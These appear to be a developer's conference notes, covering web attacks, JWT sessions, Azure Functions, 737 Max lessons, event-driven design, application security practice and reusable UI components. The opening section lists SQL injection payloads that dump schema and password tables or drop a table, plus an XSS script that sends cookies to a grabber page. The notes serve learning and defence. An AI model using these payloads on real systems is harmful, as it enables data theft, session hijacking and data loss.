### Overview
Web Application Firewall (logs) will show many common attempted attacks

    - Path traversal
    - Command injection
    - File Upload
    - File Inclusion
    -


### SQL injections

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

Start with a ' to juke the existing query syntax
End with a comment (`-- ` or `#`) to skip the end of the exsiting query (to resolve syntax errors after injection)

- List all Users. The or 1=1 makes the exsting query "always true"
    
    `' or 1=1 # `

Use `union select` to pivot into other queries

Result of your query must have the same number of columns as the exsitng query. You can find that out with something like
- Find out the number of columns in the current table/result (n + 1, so if the table has 2 colummns, the error will say `Unknown column '3' in 'order clause'`)

    `' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,`68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100 #


Use functions:
- Show version

    `' or 1=1 union select null, version() #`

- Show current time lol

    `0' or 1=1 union select null, now() #`

- Show current database

    `' or 1=1 union select null, database() #`

- Show user database is running as

    `' or 1=1 union select null, user() #`

Use other queries. 

- List database tables

    `' and 1=1 union select null, table_name from information_schema.tables # `

- List column names of a table

    `' union select null, column_name from information_schema.columns where table_name = 'users' #`

    `' union select null, column_name from information_schema.columns where table_name = 'guestbook' #`

- Read comments from guestbook

    `' union select name, comment from guestbook #`

- Read passwords from users

    `' union select user_id, password from users #`

- Delete a table    

    '; drop table guestbook #

### Cross site scripting

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

Effective way of stealing cookies (Access user's cookie store and send somewhere)
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>

BEEF is a tool which can be used to build xss scripts

excess-xss.com

### Cross Site Request Forgery

Abusing cookies for impersonation and priveledge escalation

With REST GET requests, site cookies are sent along with the request


### Direct Object Access

Look for IDs in URLs, etc

Mitigate with RBAC on resources.


### Session Management

jwt.io - Web UI for decoding Javascript Web Tokens

JWT's consist of 3 b64 blobs separated by '.' The first blob is a header, describing the type of token and hash algorithm to use for verification. Second is the paylod data (json). Third is a verification blob formatted as 

    HMACSHA256(
        base64UrlEncode(header) + "." +
        base64UrlEncode(payload), +
        your salt
    )
  
JWTs are commonly used as "Session Tokens", which describe the session (lol) - ie, user, browser data, time, expiry time, etc.

"authentication tokens" which describe the user, their permissions, issue and expiry time

Always manage these infos as separate tokens. Don't combine Session and Authentication Tokens

SAML is an XML based standard for web browser single sign-on.

Web Application Firewalls's
    - Good at detecting injection and XSS accacks
    - Won't help with Direct Object Access and most CSRF attacks
    - Deploy them in Dev & Staging Environments as well as Prod
    - Don't start in Prod or you will likely encounter unintended behavior
    - Can start with 'audit' vs 'block' mode to validate expected behavior

During upgrades, wipe everything (configs, static files) and start fresh :)

Don't hardcode secrets, use a vault, and rotate them

be wary of secret management in k8s

Design apps with security in mind. "Bolting On" security after the fact is error prone
Do threat modeling early, and revisit this exercise regularly. (Actors & Motivations)
Document the locations of all sensitive infomation in your application

Produce audit logs 

Audit your dependencies (Vet them, Updates, etc). Regular minor version updates are much easier to deal with than infrequent large updates. Can do this during CICD
Run some static analysis during CICD as well

## REST Microservices with Azure Functions

### Representational State Transfer:
REST services are Stateless, Cache-able Layered, with a Consistent Interface

GET POST(create) PUT(update/overwrite) PATCH(partial update) DELETE

Status codes: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status

### Serverless
Azure Function 
- Docs: https://docs.microsoft.com/en-us/azure/azure-functions/
- Durable (Stateful) Function extension: https://docs.microsoft.com/en-us/azure/azure-functions/durable/durable-functions-overview
- Github: https://github.com/Azure/Azure-Functions

Serverless: Don't worry about config, scaling, and generally just think about the server, less ðŸ˜œ

Languages supported out of the box: c# js, pwsh, java, python, custom handlers for others
- Custom Handler docs for go https://docs.microsoft.com/en-us/azure/azure-functions/create-first-function-vs-code-other?tabs=go%2Cmacos

Cheap$ - Pay per use, not time. Premium plan allows for services to always be warm (And allows private IPs)
- Use includes # of requests, and also the amount of Memory used by your service while it's running

Integrates easily with other azure offerings. Event hub, storage accounts, etc - These services can also trigger functions

A 'Function App' is a project which can contain multiple 'Functions'. Triggering one Function will 'warm' all functions in the App.
Organize function apps for performance & scaleability. Don't want to spin up unrelated functions if you can avoid it

Q: Is 'CareType' an App, with a function for each HTTP method? Or were multiple APIs hosted by a more encompassing app

Each HTTP handler implemented as a separate function.

#### Gotchas:
Testing challenges:
    - Need to test interactions between services
    - Can bundle things and mock e2e tests

Security concerns: Shared infra by nature. Public IPs only unless on premium

Azure Functions have a capped runtime - 5min by default, but can push to 10 in settings. Other infra / paas offerings allow for long runtimes

You'll also suffer from a cold start, but on the other hand you don't pay for downtime. You can rig a service to ping your function every so often to keep it warm.

Vendor Lock in? Hard to migrate entire set-ups between providers

Avoid cross-function communication

Avoid sharing storage accounts (code for functions live in a SA. Separate Apps should use separate SA's)

Avoid blocking calls & use Async 

## Lessons learned from the 737 Max

At takeoff: Redundent instruments read different measurements: Speed and AOA. Within 1min of takeoff the speed and altitude measurements were noticeably off 

Double and triple check assumptions. Hire SMEs. Get as close to the problem as possibl 

Fail safe instead of Fail-proof

Option to Opt out of automtaion in critical scenarios. Balance Reality and "Making life easier"

Use cases, Abuse cases, Safety cases. Don't assume safety - make it a requirement. Be wary when requirements are not technical (political)

No training = No awareness. MCAS system was kept behind a curtain

Cheap is Expensive. Countries trusted FAA. FAA trusted Boeing. Boeing outsourced

## Event driven Microservices

Producers, Ingestion (storage), Consumers
- Producers and Consumers don't need to know about each other

Allows decoupling & encapsulation of functionality

When to use
- Multiple subsystems
- Real Time processing
- Complex event handling
- High Volume applications

Drawbacks:
- Learning Curve
- Increased complexity (More infra)
- Loss of transactionality (Non-sequential - Eventually consistent)
- No *guarantee* that consumers will receive all events

Azure Event Hubs - a managed, real time ingestion service. Simple, trusted, scaleable
- docs: https://docs.microsoft.com/en-us/azure/event-hubs/
- Built on OSS services (Kafka, AMPQ, https)
- Charged by 'Throughput Units' (ingress & egress). Can enable auto scale-up, but need to implement scale-down through monitoring or something

## How to succeed at application security without even trying

- AppSec focuses on securing Application
- DevSec focuses on securing  Developer Actions
- DevSecOps focuses on securing Build chain

Security is a responsibility for dev teams. There are many ways to facillitate this.

Do threat modeling for your service on a regular basis. Answer
- Actors & Motivations
- What are we working on?
    - Services, data movement, boundaries, auth scope
- What can go wrong?
- What do we do about it?
- Is that good enough?
- What happens if X happens Y
- Security theatre - Imagine some crazy shit happens that changes how our services are used


Good logging is essential for catching security incidents. You should also audit/monitor those logs, looking for security-impactful events

A significant, rising amount of breaches over the last few years have installed ransomware. Have 3 backups of data, with immutable and an offline copy. Test Recovery

Practice Defense in depth:
- Implement MFA - passwords are terrible, test for weak ones, can block known word lists. Use a 3rd part auth provider
- Use Canaries - Fake user accounts, fake entries in robots.txt, and monitor for activity on these resources
- Use analytics to block suspicious activity (location, time, etc)
- Endpoint Detection & Response
- Static Analysis. Start doing this from day 1 if possible
- Dynamic Application Security Testing - Automate Common Vulnerabilities & Fuzzing w/ ZAP proxy in CICD before promotion

Interactive and Real-Time Application Security Tests/Protection exist, ML/AI to block unusual requests at runtime

Testing APIs can be hard, because the test is often separated from the backing logic.
For API security, watch for
- Which APIs serve sensitive information
- Understand which endpoints serve which info, and watch for utilization spikes
- Always control who can access. If anonymous access is allowed, explicitly mark those endpoints as such (add decorates on the handlers)

Unit Tests are important, because they allow you to upgrade libraries w/o fearing your code silently breaking. Write tests, you fool!

Pentesting is good, but doesn't need to be prioritized before implementing mitigations. If mgmt pushes for one, you can tell them
- Can't sit on the results (must fix). Customers may ask for the report
- retest can be expensive. but good pentesters will include this in the initial fee, and may even give scripts to repeat the exploit
- Some people don't give good insights, just tool output. It might not even be valid!
- Some groups outsource their pentesters to whoever
- Can do your own pentests! Red teaming in-house. Red Team vs Blue team games are fun and productive

Involve Development when selecting Vendors. Walk through user stories and get dev feedback on the implementation.
- Have multiple competitors and be willing to walk away.
- If you need to drop a vendor, do so incrementally (cut licenses in half)

Write and Publish post mortems for security events, just like reliability incidents

## Building reusable components that are actually reusable

Library of generic component elements meant to be useable in multiple projects and contexts

https://www.pluralsight.com/authors/cory-house

http://storybook.js.org Storybook is an open source tool for building UI components and pages in isolation

Reusable components allow for
- consistency
- less code
- reliable implementations
- faster development
- improved accessibility 

They're tricky to plan for, and you should dedicate someone on your team full time to their construction. Another good idea is to rotate these maintainers into development teams so that they 'dogfood' their re-usable components. This feedback will help to continually improve the library

When planning a reusable component, decide on 
- the audience for your library
- rigid or flexible use case
- atomic design (built from well defined, single purpose pieces). ex, a Button is an 'atom' - a signup form is a 'molecule', made from other atomic components. 
- Will you Link, wrap, or Fork external libraries?
- Open or Inner Source?


Documenting your library
- How should devs or designers use these? Have a doc section for each audience
- Have demos of the component, w/ code & import examples. This will help people see how to compose different components into useful constructs. Detail the available props the component supports (Can generate these docs from docstrings - https://github.com/reactjs/react-docgen)
- Group situationally related components in your documentation
- Maintain good release notes (links to PRs, semVer, categorization). Semantic versioning is particularly valuable for reusable component libraries, to add clarity for devs when they upgrade the library in their projects
